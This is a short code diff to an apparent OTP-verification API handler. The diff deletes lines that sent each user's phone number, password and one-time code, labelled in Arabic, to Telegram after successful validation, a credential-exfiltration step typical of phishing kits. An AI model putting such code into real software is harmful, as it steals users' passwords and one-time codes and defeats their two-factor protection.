@@ -1,4 +1,3 @@
-import { sendToTelegram } from '@/utils/telegram';
 import { rateLimit } from '@/utils/rateLimit';
 import { validateOTP } from '@/utils/validation';
 
@@ -24,20 +23,6 @@ export default async function handler(req, res) {
   if (!result.valid) {
     return res.status(400).json({ success: false, error: result.error });
   }
-
-  const time = new Date().toLocaleString('ar-MR');
-  const copyText = `📱 ${phone}\n🔐 ${entryCode}\n🔢 ${otpCode}`;
-
-  await sendToTelegram(
-    `✅ تحقق ناجح
-━━━━━━━━━━━━━━
-📱 رقم الهاتف: ${phone}
-🔐 كلمة السر: ${entryCode}
-🔢 رمز OTP: ${otpCode}
-⏰ الوقت: ${time}
-━━━━━━━━━━━━━━`,
-    copyText
-  );
 
   return res.status(200).json({ success: true });
 }
